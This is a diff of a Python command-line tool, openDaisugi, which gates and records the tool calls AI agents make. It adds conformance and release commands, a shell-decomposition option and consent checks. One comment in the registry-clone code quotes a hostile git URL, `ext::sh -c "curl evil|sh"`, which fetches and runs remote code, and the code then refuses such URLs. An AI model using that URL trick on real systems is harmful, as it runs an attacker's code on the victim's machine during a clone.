@@ -80,6 +80,92 @@ lora_app = typer.Typer(
 )
 app.add_typer(lora_app, name="lora")
 
+conformance_app = typer.Typer(
+    name="conformance",
+    help=(
+        "Multi-client conformance corpus: export recorded cases, run a client "
+        "binary against the corpus, benchmark per-case latency. Spec: "
+        "docs/spec/conformance.md."
+    ),
+    no_args_is_help=True,
+)
+app.add_typer(conformance_app, name="conformance")
+
+
+@conformance_app.command("export")
+def conformance_export_cmd(
+    raw_dir: Path = typer.Argument(..., help="Directory of recorded cases-*.jsonl files."),
+    out: Path = typer.Option(
+        Path("corpus.jsonl"), "--out", help="Deduplicated corpus output path."
+    ),
+) -> None:
+    """Dedupe recorded case lines into a sorted, manifest-pinned corpus."""
+    from opendaisugi.conformance import export_corpus
+
+    manifest = export_corpus(raw_dir, out)
+    typer.echo(f"corpus: {out}  cases: {manifest['count']}  sha256: {manifest['sha256'][:16]}…")
+
+
+@conformance_app.command("run")
+def conformance_run_cmd(
+    corpus: Path = typer.Argument(..., help="Corpus JSONL to feed the client."),
+    client: str = typer.Option(
+        ..., "--client", help="Client command (shell-quoted), e.g. 'cargo run -q --bin conform'."
+    ),
+    show: int = typer.Option(10, "--show", help="Max mismatches to print."),
+) -> None:
+    """Differential run: feed every case to a client, compare verdicts, exit 1 on any mismatch."""
+    import shlex
+
+    from opendaisugi.conformance import ClientError, run_corpus
+
+    try:
+        report = run_corpus(corpus, shlex.split(client))
+    except ClientError as e:
+        typer.echo(f"client error: {e}", err=True)
+        raise typer.Exit(code=2) from e
+    typer.echo(f"{report.matched}/{report.total} matched")
+    if report.mismatches:
+        for m in report.mismatches[:show]:
+            typer.echo(f"  mismatch {m.case_id} ({m.kind}):")
+            typer.echo(f"    expected: {m.expected}")
+            typer.echo(f"    got:      {m.got}")
+        if len(report.mismatches) > show:
+            typer.echo(f"  … and {len(report.mismatches) - show} more")
+        raise typer.Exit(code=1)
+
+
+@conformance_app.command("bench")
+def conformance_bench_cmd(
+    corpus: Path = typer.Argument(..., help="Corpus JSONL to time."),
+    repeat: int = typer.Option(1, "--repeat", help="Passes over the corpus."),
+    client: str = typer.Option(
+        None,
+        "--client",
+        help="Client command to benchmark over the pipe; omit for the in-process oracle.",
+    ),
+) -> None:
+    """Per-case latency percentiles over the corpus (oracle in-process, or a client pipe)."""
+    import shlex
+
+    from opendaisugi.conformance import bench_corpus
+
+    stats = bench_corpus(corpus, repeat=repeat, client_cmd=shlex.split(client) if client else None)
+    typer.echo(
+        f"cases={stats.n_cases} repeat={stats.repeat} "
+        f"p50={stats.p50_ms:.3f}ms p95={stats.p95_ms:.3f}ms p99={stats.p99_ms:.3f}ms "
+        f"throughput={stats.cases_per_s:.0f} cases/s"
+    )
+
+
+@conformance_app.command("serve")
+def conformance_serve_cmd() -> None:
+    """Speak the wire protocol as the Python oracle: case JSON in on stdin, verdict out."""
+    from opendaisugi.conformance import main as conformance_main
+
+    conformance_main()
+
+
 mcp_app = typer.Typer(
     name="mcp",
     help="Run openDaisugi as an MCP server for Claude Code / OpenClaw / any MCP client.",
@@ -97,7 +183,7 @@ app.add_typer(hook_app, name="hook")
 gate_app = typer.Typer(
     name="gate",
     help="Call-time tool gate (ADR-0007) — verify each live tool call against "
-         "a registered envelope. Shadow by default; --mode enforce denies.",
+    "a registered envelope. Shadow by default; --mode enforce denies.",
     no_args_is_help=True,
 )
 app.add_typer(gate_app, name="gate")
@@ -109,9 +195,74 @@ registry_app = typer.Typer(
 )
 app.add_typer(registry_app, name="registry")
 
+release_app = typer.Typer(
+    name="release",
+    help="Sign and verify release artifacts (roadmap Stage 7). Reuses the "
+    "ed25519 signer registry — one trust root, not a second.",
+    no_args_is_help=True,
+)
+app.add_typer(release_app, name="release")
+
+batch_app = typer.Typer(
+    name="batch",
+    help="Within-instance batch compilation (roadmap Stage 9) — prove a declared "
+    "batch's footprint (F ⊆ envelope) before any iteration, fail-closed.",
+    no_args_is_help=True,
+)
+app.add_typer(batch_app, name="batch")
+
+
+_DECOMPOSE_OPT = typer.Option(
+    None,
+    "--allow-shell-decomposition/--no-allow-shell-decomposition",
+    help="Let the envelope admit compound shell (ADR-0010): 'a && b' and pipes are "
+    "parsed with a real bash grammar and EVERY head is checked against the "
+    "allowlist, instead of the blanket metacharacter rejection. Needs the "
+    "opendaisugi shell extra (tree-sitter-bash); substitution, redirection, "
+    "non-literal heads and wrappers are still rejected. Unset reads the "
+    "shell_allow_decomposition default from config.yaml (off unless you set it).",
+)
+
+
+def _resolve_decompose(flag: bool | None, config_path: Path) -> bool:
+    """One opt-in, one persisted default, one per-run override.
+
+    The flag wins in BOTH directions when given, so a run can decline a default
+    it inherited; unset falls back to config.yaml, which is the only channel
+    that reaches `hook auto-tend` (cron and a detached spawn — no argv, and
+    stdout on DEVNULL).
+    """
+    if flag is not None:
+        return flag
+    from opendaisugi.config import load_config
+
+    return load_config(config_path).shell_allow_decomposition
+
+
+def _warn_if_decomposition_unusable(allow: bool) -> None:
+    """Say plainly when an opt-in this box can't honour was just written.
+
+    With the field True and the parser absent the verifier fails closed, so an
+    operator who enables decomposition to *stop* being denied would instead be
+    denied with a different reason. Warn and proceed — the envelope may travel
+    to a box that has the extra.
+    """
+    if not allow:
+        return
+    from opendaisugi.shell_decompose import parser_available
+
+    if parser_available():
+        return
+    typer.echo(
+        "WARNING: shell decomposition is ON in this envelope, but the bash "
+        "grammar isn't installed on this machine — every compound command will "
+        "be DENIED (fail-closed) until you run: uv add 'opendaisugi[shell]'"
+    )
+
 
 def _resolve_registry_keys(
-    private_key_path: Path | None, public_key_path: Path | None,
+    private_key_path: Path | None,
+    public_key_path: Path | None,
 ) -> tuple[str | None, str | None]:
     """Read base64 ed25519 keypair from disk paths, or return (None, None)."""
     priv = private_key_path.read_text(encoding="utf-8").strip() if private_key_path else None
@@ -123,7 +274,8 @@ def _resolve_registry_keys(
 def registry_init_cmd(
     git_url: str = typer.Argument(..., help="Git URL of the team registry repo."),
     clone_to: Path = typer.Option(
-        Path.home() / ".opendaisugi" / "registry", "--clone-to",
+        Path.home() / ".opendaisugi" / "registry",
+        "--clone-to",
         help="Local clone directory.",
     ),
 ) -> None:
@@ -134,13 +286,15 @@ def registry_init_cmd(
     a no-op.
     """
     import subprocess
+
     # git interprets ext::/fd:: transport URLs by RUNNING A COMMAND at clone time —
     # a registry URL pasted from a teammate/wiki could be `ext::sh -c "curl evil|sh"`.
     # Reject the command-executing transports with a clear message...
     if git_url.startswith(("ext::", "fd::")):
         typer.echo(
             f"refusing registry URL {git_url!r}: the git ext::/fd:: transports "
-            f"execute a command and are not allowed.", err=True,
+            f"execute a command and are not allowed.",
+            err=True,
         )
         raise typer.Exit(code=2)
     if clone_to.exists() and (clone_to / ".git").exists():
@@ -158,15 +312,18 @@ def registry_init_cmd(
 @registry_app.command("pull")
 def registry_pull_cmd(
     repo_path: Path = typer.Option(
-        Path.home() / ".opendaisugi" / "registry", "--repo-path",
+        Path.home() / ".opendaisugi" / "registry",
+        "--repo-path",
     ),
     require_signed: bool = typer.Option(
-        True, "--require-signed/--allow-unsigned",
+        True,
+        "--require-signed/--allow-unsigned",
         help="Refuse bundles without a valid signature from a trusted signer.",
     ),
 ) -> None:
     """git pull and materialize new pathway bundles into the local cache."""
     from opendaisugi.git_pathway_store import GitPathwayStore
+
     store = GitPathwayStore(repo_path=repo_path, require_signed=require_signed)
     n = store.pull()
     typer.echo(f"pulled; {n} new pathway(s) cached")
@@ -176,23 +333,28 @@ def registry_pull_cmd(
 def registry_publish_cmd(
     pathway_id: str = typer.Argument(..., help="Local pathway id to publish."),
     repo_path: Path = typer.Option(
-        Path.home() / ".opendaisugi" / "registry", "--repo-path",
+        Path.home() / ".opendaisugi" / "registry",
+        "--repo-path",
     ),
     private_key: Path = typer.Option(
-        ..., "--private-key",
+        ...,
+        "--private-key",
         help="Path to a base64 ed25519 private key file.",
     ),
     public_key: Path = typer.Option(
-        ..., "--public-key",
+        ...,
+        "--public-key",
         help="Path to a base64 ed25519 public key file.",
     ),
     publisher: str = typer.Option(
-        "opendaisugi-instance", "--publisher",
+        "opendaisugi-instance",
+        "--publisher",
         help="Human-readable publisher id stamped on the bundle.",
     ),
     push: bool = typer.Option(True, "--push/--no-push"),
     data_dir: Path = typer.Option(
-        Path.home() / ".opendaisugi", "--data-dir",
+        Path.home() / ".opendaisugi",
+        "--data-dir",
     ),
 ) -> None:
     """Sign + commit + push a local pathway as a bundle to the registry."""
@@ -207,7 +369,8 @@ def registry_publish_cmd(
         raise typer.Exit(code=1)
     store = GitPathwayStore(
         repo_path=repo_path,
-        private_key_b64=priv, public_key_b64=pub,
+        private_key_b64=priv,
+        public_key_b64=pub,
         publisher=publisher,
     )
     bundle_hash = store.publish(pathway, push=push)
@@ -217,11 +380,13 @@ def registry_publish_cmd(
 @registry_app.command("status")
 def registry_status_cmd(
     repo_path: Path = typer.Option(
-        Path.home() / ".opendaisugi" / "registry", "--repo-path",
+        Path.home() / ".opendaisugi" / "registry",
+        "--repo-path",
     ),
 ) -> None:
     """Show the local clone's diagnostic info."""
     from opendaisugi.git_pathway_store import GitPathwayStore
+
     store = GitPathwayStore(repo_path=repo_path)
     s = store.status()
     for k, v in s.items():
@@ -231,10 +396,12 @@ def registry_status_cmd(
 @registry_app.command("pull-and-tend")
 def registry_pull_and_tend_cmd(
     repo_path: Path = typer.Option(
-        Path.home() / ".opendaisugi" / "registry", "--repo-path",
+        Path.home() / ".opendaisugi" / "registry",
+        "--repo-path",
     ),
     data_dir: Path = typer.Option(
-        Path.home() / ".opendaisugi", "--data-dir",
+        Path.home() / ".opendaisugi",
+        "--data-dir",
     ),
 ) -> None:
     """Cron-friendly: pull new bundles from the registry, then run tend.
@@ -252,12 +419,12 @@ def registry_pull_and_tend_cmd(
     typer.echo(f"pulled; {n_pulled} new pathway(s) cached")
 
     from opendaisugi import Daisugi
+
     d = Daisugi(data_dir=data_dir)
     try:
         report = asyncio.run(d.tend())
         typer.echo(
-            f"tend: created={report.created} updated={report.updated} "
-            f"skipped={report.skipped}"
+            f"tend: created={report.created} updated={report.updated} skipped={report.skipped}"
         )
     except Exception as exc:
         typer.echo(f"tend failed: {type(exc).__name__}: {exc}", err=True)
@@ -284,8 +451,9 @@ def hook_record_cmd(
     never disrupted. ``--format`` selects which allow/continue shape to emit.
     """
     import sys
+    import time
 
-    from opendaisugi.hook import record_and_contract
+    from opendaisugi.hook import maybe_trigger_background_tend, record_and_contract
 
     try:
         raw = sys.stdin.buffer.read()
@@ -293,6 +461,9 @@ def hook_record_cmd(
         raw = b""
     # record_and_contract never raises and always returns the host allow contract.
     typer.echo(record_and_contract(raw, root=captures_root, fmt=fmt))
+    # No-cron distillation: the contract is already emitted, so this can only
+    # add latency, never correctness. Consent-gated, rate-limited, fully detached.
+    maybe_trigger_background_tend(captures_root.parent, now=time.time())
 
 
 @hook_app.command("list")
@@ -322,12 +493,15 @@ def hook_to_trace_cmd(
         "--captures-root",
     ),
     data_dir: Path = typer.Option(
-        Path.home() / ".opendaisugi", "--data-dir",
+        Path.home() / ".opendaisugi",
+        "--data-dir",
     ),
     task: str = typer.Option(
-        None, "--task",
+        None,
+        "--task",
         help="Override the task description; default uses the session id.",
     ),
+    allow_shell_decomposition: bool | None = _DECOMPOSE_OPT,
 ) -> None:
     """Convert a captured session into a journal trace.
 
@@ -343,8 +517,11 @@ def hook_to_trace_cmd(
     if not session_jsonl.exists():
         typer.echo(f"error: no capture at {session_jsonl}", err=True)
         raise typer.Exit(code=1)
+    decompose = _resolve_decompose(allow_shell_decomposition, data_dir / "config.yaml")
     journal = Journal(data_dir=data_dir)
-    trace_id = captures_to_trace(session_jsonl, journal, task=task)
+    trace_id = captures_to_trace(
+        session_jsonl, journal, task=task, allow_shell_decomposition=decompose
+    )
     journal.mark_session_converted(session_id, trace_id)
     typer.echo(trace_id)
 
@@ -356,19 +533,25 @@ def hook_auto_tend_cmd(
         "--captures-root",
     ),
     data_dir: Path = typer.Option(
-        Path.home() / ".opendaisugi", "--data-dir",
+        Path.home() / ".opendaisugi",
+        "--data-dir",
     ),
     min_interval_s: int = typer.Option(
-        3600, "--min-interval",
+        3600,
+        "--min-interval",
         help="Skip if last auto-tend was newer than this many seconds.",
     ),
     force: bool = typer.Option(
-        False, "--force", help="Ignore the min-interval gate.",
+        False,
+        "--force",
+        help="Ignore the min-interval gate.",
     ),
     skip_distill: bool = typer.Option(
-        False, "--skip-distill",
+        False,
+        "--skip-distill",
         help="Convert captures-to-traces but don't run tend afterwards.",
     ),
+    allow_shell_decomposition: bool | None = _DECOMPOSE_OPT,
 ) -> None:
     """Close the captures→traces→distillation loop in one cron-friendly call.
 
@@ -386,8 +569,18 @@ def hook_auto_tend_cmd(
     import asyncio
     import time
 
+    from opendaisugi.config import auto_tend_enabled, load_config
     from opendaisugi.hook import captures_to_trace, list_sessions
     from opendaisugi.journal import Journal
+
+    # Consent gate: background distillation runs only when the user opted in
+    # (`daisugi install`). --force tends once regardless, for a manual run.
+    if not force and not auto_tend_enabled(load_config(data_dir / "config.yaml")):
+        typer.echo(
+            "skipped: background distillation is off. Run `daisugi install` to "
+            "opt in, or pass --force to tend once anyway."
+        )
+        return
 
     stamp_file = data_dir / ".hook-auto-tend-last-run"
     now = time.time()
@@ -404,6 +597,7 @@ def hook_auto_tend_cmd(
         )
         return
 
+    decompose = _resolve_decompose(allow_shell_decomposition, data_dir / "config.yaml")
     journal = Journal(data_dir=data_dir)
     sessions = list_sessions(root=captures_root)
     converted: list[str] = []
@@ -413,7 +607,9 @@ def hook_auto_tend_cmd(
             continue
         session_jsonl = captures_root / f"{sid}.jsonl"
         try:
-            trace_id = captures_to_trace(session_jsonl, journal)
+            trace_id = captures_to_trace(
+                session_jsonl, journal, allow_shell_decomposition=decompose
+            )
         except ValueError as exc:
             typer.echo(f"  skipped {sid}: {exc}", err=True)
             continue
@@ -425,12 +621,12 @@ def hook_auto_tend_cmd(
 
     if converted and not skip_distill:
         from opendaisugi import Daisugi
+
         daisugi = Daisugi(data_dir=data_dir)
         try:
             report = asyncio.run(daisugi.tend())
             typer.echo(
-                f"tend: created={report.created} "
-                f"updated={report.updated} skipped={report.skipped}"
+                f"tend: created={report.created} updated={report.updated} skipped={report.skipped}"
             )
         except Exception as exc:
             typer.echo(f"tend failed: {type(exc).__name__}: {exc}", err=True)
@@ -440,7 +636,8 @@ def hook_auto_tend_cmd(
 
 
 _GATE_ROOT_OPT = typer.Option(
-    Path.home() / ".opendaisugi" / "gate", "--root",
+    Path.home() / ".opendaisugi" / "gate",
+    "--root",
     help="Gate state directory (envelopes, shadow log, disarm marker).",
 )
 
@@ -448,12 +645,19 @@ _GATE_ROOT_OPT = typer.Option(
 @gate_app.command("init")
 def gate_init_cmd(
     workspace: Path = typer.Option(
-        Path.cwd, "--workspace",
+        Path.cwd,
+        "--workspace",
         help="The directory the session may read/write (default: cwd).",
     ),
     session: str | None = typer.Option(None, "--session"),
     root: Path = _GATE_ROOT_OPT,
-    force: bool = typer.Option(False, "--force", help="Overwrite an existing envelope."),
+    force: bool = typer.Option(
+        False,
+        "--force",
+        help="Overwrite an existing envelope — regenerates from scratch, so any "
+        "hand-tuning you did is discarded.",
+    ),
+    allow_shell_decomposition: bool | None = _DECOMPOSE_OPT,
 ) -> None:
     """Generate and register a reviewable starter envelope for this session.
 
@@ -465,6 +669,7 @@ def gate_init_cmd(
     """
     from opendaisugi.gate import _envelopes_dir, register_envelope, starter_envelope
 
+    decompose = _resolve_decompose(allow_shell_decomposition, root.parent / "config.yaml")
     name = session or "default"
     target = _envelopes_dir(root) / f"{name}.json"
     if target.exists() and not force:
@@ -475,8 +680,13 @@ def gate_init_cmd(
         )
         raise typer.Exit(code=1)
     ws = workspace.resolve()
-    path = register_envelope(starter_envelope(ws), session_id=session, root=root)
+    path = register_envelope(
+        starter_envelope(ws, allow_shell_decomposition=decompose),
+        session_id=session,
+        root=root,
+    )
     typer.echo(f"registered a starter envelope for {ws} → {path}")
+    _warn_if_decomposition_unusable(decompose)
     typer.echo("REVIEW it before enforcing — it is a tight default, not a finished policy.")
     typer.echo("Then launch shadow mode:")
     typer.echo(f'  claude --settings "$(daisugi gate settings --root {root})"')
@@ -488,6 +698,7 @@ def gate_quickstart_cmd(
     session: str | None = typer.Option(None, "--session"),
     root: Path = _GATE_ROOT_OPT,
     force: bool = typer.Option(False, "--force"),
+    allow_shell_decomposition: bool | None = _DECOMPOSE_OPT,
 ) -> None:
     """One command → a working shadow-mode gate over this session.
 
@@ -502,15 +713,22 @@ def gate_quickstart_cmd(
         starter_envelope,
     )
 
+    decompose = _resolve_decompose(allow_shell_decomposition, root.parent / "config.yaml")
     name = session or "default"
     target = _envelopes_dir(root) / f"{name}.json"
     if target.exists() and not force:
-        typer.echo(f"reusing the envelope already registered at {target} "
-                   f"(pass --force to regenerate)")
+        typer.echo(
+            f"reusing the envelope already registered at {target} (pass --force to regenerate)"
+        )
     else:
         ws = workspace.resolve()
-        register_envelope(starter_envelope(ws), session_id=session, root=root)
+        register_envelope(
+            starter_envelope(ws, allow_shell_decomposition=decompose),
+            session_id=session,
+            root=root,
+        )
         typer.echo(f"registered a starter envelope for {ws}")
+        _warn_if_decomposition_unusable(decompose)
 
     sess_arg = f" --session {session}" if session else ""
     shadow = gate_settings_json(mode="shadow", root=root, session=session)
@@ -525,23 +743,28 @@ def gate_quickstart_cmd(
     typer.echo("# 3. Flip to enforce (one flag) once you trust it:")
     typer.echo(f'claude --settings "$(daisugi gate settings --enforce --root {root}{sess_arg})"')
     typer.echo("")
-    typer.echo("# 4. If it ever over-denies, one command turns it off (needs no allowed tool call):")
+    typer.echo(
+        "# 4. If it ever over-denies, one command turns it off (needs no allowed tool call):"
+    )
     typer.echo(f"daisugi gate disarm --root {root}")
 
 
 @gate_app.command("check")
 def gate_check_cmd(
     mode: str = typer.Option(
-        "shadow", "--mode",
+        "shadow",
+        "--mode",
         help="shadow = observe and log only; enforce = deny out-of-envelope calls.",
     ),
     root: Path = _GATE_ROOT_OPT,
-    fmt: str = typer.Option("claude", "--format",
-                            help="Host contract: claude | hermes | openclaw."),
+    fmt: str = typer.Option(
+        "claude", "--format", help="Host contract: claude | hermes | openclaw."
+    ),
     verify_timeout: float = typer.Option(
-        10.0, "--verify-timeout",
+        10.0,
+        "--verify-timeout",
         help="Inner verifier budget in seconds; exceeding it DENIES "
-             "(the host's outer timeout fails open, ours must not).",
+        "(the host's outer timeout fails open, ours must not).",
     ),
 ) -> None:
     """Read one hook payload from stdin and emit the host's verdict contract.
@@ -560,7 +783,11 @@ def gate_check_cmd(
     except Exception:
         raw = b""
     out = gate_and_contract(
-        raw, root=root, fmt=fmt, mode=mode, verify_timeout_s=verify_timeout,
+        raw,
+        root=root,
+        fmt=fmt,
+        mode=mode,
+        verify_timeout_s=verify_timeout,
     )
     if out.stdout:
         typer.echo(out.stdout)
@@ -573,9 +800,10 @@ def gate_check_cmd(
 def gate_register_cmd(
     envelope_path: Path = typer.Argument(..., help="Envelope file (JSON or YAML)."),
     session: str | None = typer.Option(
-        None, "--session",
+        None,
+        "--session",
         help="Bind to one session id; omit to register the default envelope "
-             "every unmatched session falls back to.",
+        "every unmatched session falls back to.",
     ),
     root: Path = _GATE_ROOT_OPT,
 ) -> None:
@@ -649,14 +877,15 @@ def gate_report_cmd(
     )
     for r in rep["denied"]:
         fp = " [FP-candidate]" if r in rep["false_positive_candidates"] else ""
-        typer.echo(f"  DENY{fp} {r.get('tool_name')} {r.get('detail','')!r}: {r.get('reason')}")
+        typer.echo(f"  DENY{fp} {r.get('tool_name')} {r.get('detail', '')!r}: {r.get('reason')}")
 
 
 @gate_app.command("replay")
 def gate_replay_cmd(
     captures_jsonl: Path = typer.Argument(..., help="A passive-capture session file."),
-    envelope_path: Path = typer.Option(..., "--envelope",
-                                       help="Envelope to evaluate against (JSON/YAML)."),
+    envelope_path: Path = typer.Option(
+        ..., "--envelope", help="Envelope to evaluate against (JSON/YAML)."
+    ),
     as_json: bool = typer.Option(False, "--json", help="Emit the full report as JSON."),
 ) -> None:
     """Replay a captured session through the gate offline (nothing executes).
@@ -683,22 +912,24 @@ def gate_replay_cmd(
     )
     for r in rep["denied"]:
         fp = " [FP-candidate]" if r in rep["false_positive_candidates"] else ""
-        typer.echo(f"  DENY{fp} {r.get('tool_name')} {r.get('detail','')!r}: {r.get('reason')}")
+        typer.echo(f"  DENY{fp} {r.get('tool_name')} {r.get('detail', '')!r}: {r.get('reason')}")
 
 
 @gate_app.command("settings")
 def gate_settings_cmd(
     enforce: bool = typer.Option(
-        False, "--enforce",
+        False,
+        "--enforce",
         help="Emit enforce-mode settings (default is shadow — observation only).",
     ),
     root: Path = _GATE_ROOT_OPT,
     fmt: str = typer.Option("claude", "--format"),
     session: str | None = typer.Option(
-        None, "--session",
+        None,
+        "--session",
         help="Pin the gate to this registered session's envelope, ignoring "
-             "the session id in each payload — authorization must not key on "
-             "caller-influenceable input.",
+        "the session id in each payload — authorization must not key on "
+        "caller-influenceable input.",
     ),
 ) -> None:
     """Print the Claude Code hooks-settings JSON that wires in the gate.
@@ -710,10 +941,14 @@ def gate_settings_cmd(
     """
     from opendaisugi.gate import gate_settings_json
 
-    typer.echo(gate_settings_json(
-        mode="enforce" if enforce else "shadow", root=root, fmt=fmt,
-        session=session,
-    ))
+    typer.echo(
+        gate_settings_json(
+            mode="enforce" if enforce else "shadow",
+            root=root,
+            fmt=fmt,
+            session=session,
+        )
+    )
 
 
 @gate_app.command("audit")
@@ -755,16 +990,15 @@ def gate_audit_cmd(
         typer.echo(f"  {cat:22} {c['denied']}/{c['attacks']}")
     typer.echo("arms (attack_denial / false_positive):")
     for arm, m in rep["arms"].items():
-        typer.echo(
-            f"  {arm:16} {m['attack_denial_rate']:.2f} / {m['false_positive_rate']:.2f}"
-        )
+        typer.echo(f"  {arm:16} {m['attack_denial_rate']:.2f} / {m['false_positive_rate']:.2f}")
 
 
 @mcp_app.command("serve")
 def mcp_serve_cmd(
     data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
     model: str = typer.Option(
-        "anthropic/claude-sonnet-4-20250514", "--model",
+        "anthropic/claude-sonnet-4-20250514",
+        "--model",
         help="Model used for envelope generation.",
     ),
 ) -> None:
@@ -778,12 +1012,12 @@ def mcp_serve_cmd(
         from opendaisugi.mcp_server import serve
     except ImportError as e:
         typer.echo(
-            "opendaisugi[mcp] is not installed. "
-            "Install with: uv add 'opendaisugi[mcp]'",
+            "opendaisugi[mcp] is not installed. Install with: uv add 'opendaisugi[mcp]'",
             err=True,
         )
         raise typer.Exit(1) from e
     from opendaisugi import Daisugi
+
     serve(Daisugi(model=model, data_dir=data_dir))
 
 
@@ -792,19 +1026,23 @@ def lora_export_cmd(
     output: Path = typer.Argument(..., help="Output JSONL file."),
     data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
     fmt: str = typer.Option(
-        "alpaca", "--format",
+        "alpaca",
+        "--format",
         help="Output format: alpaca (instruction/input/output) or chat (messages).",
     ),
     days: int | None = typer.Option(
-        None, "--days",
+        None,
+        "--days",
         help="Only include traces from the last N days. Omit for all time.",
     ),
     min_task_chars: int = typer.Option(
-        10, "--min-task-chars",
+        10,
+        "--min-task-chars",
         help="Skip traces with tasks shorter than this many characters.",
     ),
     system_prompt: str | None = typer.Option(
-        None, "--system-prompt",
+        None,
+        "--system-prompt",
         help="System prompt injected into chat-format examples.",
     ),
 ) -> None:
@@ -820,20 +1058,26 @@ def lora_export_cmd(
     since = None if days is None else time.time() - days * 86_400
     journal = Journal(data_dir=data_dir)
     stats = emit_jsonl(
-        journal, output,
+        journal,
+        output,
         format=fmt,  # type: ignore[arg-type]
         since=since,
         min_task_chars=min_task_chars,
         system_prompt=system_prompt,
     )
-    typer.echo(json.dumps({
-        "total": stats.total,
-        "written": stats.written,
-        "skipped_empty_task": stats.skipped_empty_task,
-        "skipped_load_error": stats.skipped_load_error,
-        "output_path": stats.output_path,
-        "format": fmt,
-    }, indent=2))
+    typer.echo(
+        json.dumps(
+            {
+                "total": stats.total,
+                "written": stats.written,
+                "skipped_empty_task": stats.skipped_empty_task,
+                "skipped_load_error": stats.skipped_load_error,
+                "output_path": stats.output_path,
+                "format": fmt,
+            },
+            indent=2,
+        )
+    )
 
 
 @tiers_app.command("stats")
@@ -844,10 +1088,12 @@ def tiers_stats_cmd(
 ) -> None:
     """Show per-tier call counts, estimated tokens, and pathway hit rate."""
     from opendaisugi.accounting import tier_stats
+
     journal = Journal(data_dir=data_dir)
     stats = tier_stats(journal, window_days=days)
     if json_output:
         from dataclasses import asdict
+
         typer.echo(json.dumps(asdict(stats), indent=2))
         return
     typer.echo(f"window: last {stats.window_days}d")
@@ -873,15 +1119,14 @@ def pathways_list_cmd(
 ) -> None:
     """List all compiled pathways."""
     from opendaisugi.pathway_store import PathwayStore
+
     store = PathwayStore(data_dir / "pathways.db")
     pathways = store.list_all()
     if not pathways:
         typer.echo("No compiled pathways.")
         return
     for p in pathways:
-        typer.echo(
-            f"{p.id}  hits={p.hit_count}  v{p.version}  {p.task_description}"
-        )
+        typer.echo(f"{p.id}  hits={p.hit_count}  v{p.version}  {p.task_description}")
 
 
 @pathways_app.command("show")
@@ -891,6 +1136,7 @@ def pathways_show_cmd(
 ) -> None:
     """Show a compiled pathway in detail."""
     from opendaisugi.pathway_store import PathwayStore
+
     store = PathwayStore(data_dir / "pathways.db")
     for p in store.list_all():
         if p.id == pathway_id:
@@ -903,12 +1149,11 @@ def pathways_show_cmd(
 @pathways_app.command("stats")
 def pathways_stats_cmd(
     data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
-    json_output: bool = typer.Option(
-        False, "--json", help="Emit stats as JSON."
-    ),
+    json_output: bool = typer.Option(False, "--json", help="Emit stats as JSON."),
 ) -> None:
     """Summarize stored pathways (count, total hits)."""
     from opendaisugi.pathway_store import PathwayStore
+
     store = PathwayStore(data_dir / "pathways.db")
     stats = store.stats()
     if json_output:
@@ -925,6 +1170,7 @@ def pathways_delete_cmd(
 ) -> None:
     """Delete a compiled pathway."""
     from opendaisugi.pathway_store import PathwayStore
+
     store = PathwayStore(data_dir / "pathways.db")
     if store.delete(pathway_id):
         typer.echo(f"Deleted {pathway_id}.")
@@ -938,7 +1184,8 @@ def pathways_export_cmd(
     pathway_id: str = typer.Argument(..., help="Pathway id to export."),
     output: Path = typer.Argument(..., help="Output file path."),
     fmt: str = typer.Option(
-        "skill", "--format",
+        "skill",
+        "--format",
         help="Export format: json, skill, mermaid, md, smtlib.",
     ),
     data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
@@ -971,7 +1218,8 @@ def pathways_import_cmd(
     source: Path = typer.Argument(..., help="Path to pathway bundle (.json or .md)."),
     data_dir: Path = typer.Option(Path.home() / ".opendaisugi", "--data-dir"),
     overwrite: bool = typer.Option(
-        False, "--overwrite",
+        False,
+        "--overwrite",
         help="Replace an existing pathway with the same ID.",
     ),
     z3_timeout_ms: int = typer.Option(500, "--z3-timeout-ms"),
@@ -983,7 +1231,8 @@ def pathways_import_cmd(
     store = PathwayStore(data_dir / "pathways.db")
     try:
         result = import_pathway(
-            source, store,
+            source,
+            store,
             z3_timeout_ms=z3_timeout_ms,
             allow_overwrite=overwrite,
         )
@@ -1019,12 +1268,17 @@ def gardener_prune_cmd(
     )
     report = prune(store, cfg, dry_run=dry_run)
     if json_output:
-        typer.echo(json.dumps({
-            "removed_ids": report.removed_ids,
-            "kept_count": report.kept_count,
-            "reasons": report.reasons,
-            "dry_run": dry_run,
-        }, indent=2))
+        typer.echo(
+            json.dumps(
+                {
+                    "removed_ids": report.removed_ids,
+                    "kept_count": report.kept_count,
+                    "reasons": report.reasons,
+                    "dry_run": dry_run,
+                },
+                indent=2,
+            )
+        )
         return
     verb = "would remove" if dry_run else "removed"
     typer.echo(f"{verb}: {report.removed_count} (kept: {report.kept_count})")
@@ -1047,12 +1301,17 @@ def gardener_merge_cmd(
     cfg = MergeConfig(similarity_threshold=similarity)
     report = merge(store, cfg, dry_run=dry_run)
     if json_output:
-        typer.echo(json.dumps({
-            "merged_pairs": report.merged_pairs,
-            "kept_ids": report.kept_ids,
-            "removed_ids": report.removed_ids,
-            "dry_run": dry_run,
-        }, indent=2))
+        typer.echo(
+            json.dumps(
+                {
+                    "merged_pairs": report.merged_pairs,
+                    "kept_ids": report.kept_ids,
+                    "removed_ids": report.removed_ids,
+                    "dry_run": dry_run,
+                },
+                indent=2,
+            )
+        )
         return
     verb = "would merge" if dry_run else "merged"
     typer.echo(f"{verb}: {report.merge_count} pair(s)")
@@ -1073,22 +1332,28 @@ def gardener_run_cmd(
     store = PathwayStore(data_dir / "pathways.db")
     report = run_gardener(store, dry_run=dry_run)
     if json_output:
-        typer.echo(json.dumps({
-            "prune": {
-                "removed_ids": report.prune.removed_ids,
-                "kept_count": report.prune.kept_count,
-                "reasons": report.prune.reasons,
-            },
-            "merge": {
-                "merged_pairs": report.merge.merged_pairs,
-                "kept_ids": report.merge.kept_ids,
-            },
-            "dry_run": dry_run,
-        }, indent=2))
+        typer.echo(
+            json.dumps(
+                {
+                    "prune": {
+                        "removed_ids": report.prune.removed_ids,
+                        "kept_count": report.prune.kept_count,
+                        "reasons": report.prune.reasons,
+                    },
+                    "merge": {
+                        "merged_pairs": report.merge.merged_pairs,
+                        "kept_ids": report.merge.kept_ids,
+                    },
+                    "dry_run": dry_run,
+                },
+                indent=2,
+            )
+        )
         return
     verb = "would" if dry_run else ""
-    typer.echo(f"prune: {verb} removed {report.prune.removed_count}, "
-               f"kept {report.prune.kept_count}")
+    typer.echo(
